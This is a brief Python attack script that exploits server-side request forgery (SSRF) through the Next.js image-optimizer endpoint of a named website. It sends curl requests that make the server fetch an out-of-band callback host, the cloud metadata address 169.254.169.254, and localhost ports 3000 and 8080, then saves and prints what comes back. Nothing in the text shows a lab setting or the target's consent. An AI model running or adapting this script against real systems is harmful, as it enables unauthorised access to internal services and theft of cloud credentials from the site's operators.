import subprocess, urllib.parse, sys, time

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
DOM = 'dau2p4ghgqag02k5emggc5xu6hph3m973' + '.oast.abhedi.co.in'
BASE = 'https://www.infinitycapital.bh/_next/image'

def img(target, tag):
    u = BASE + '?url=' + urllib.parse.quote(target, safe='') + '&w=640&q=75'
    r = subprocess.run(['curl', '-s', '-k', '-m', '30', '-A', UA, '-o', '/tmp/d14_%s.bin' % tag,
                        '-w', 'code=%{http_code} len=%{size_download} ct=%{content_type}', u],
                       capture_output=True, text=True)
    print('%-46s %s' % (tag, r.stdout))
    try:
        d = open('/tmp/d14_%s.bin' % tag, 'rb').read()
        print('    head:', d[:120])
    except Exception as e:
        print('    err', e)

# 1. SSRF to OOB host over http
h = 'oob382a71c314ae.' + DOM
for i in range(3):
    img('http://' + h + '/ssrf-d14', 'ssrf%d' % i)

# 2. cloud metadata
img('http://169.254.169.254/latest/meta-data/', 'meta')

# 3. localhost probe
img('http://127.0.0.1:3000/', 'local3000')
img('http://127.0.0.1:8080/', 'local8080')
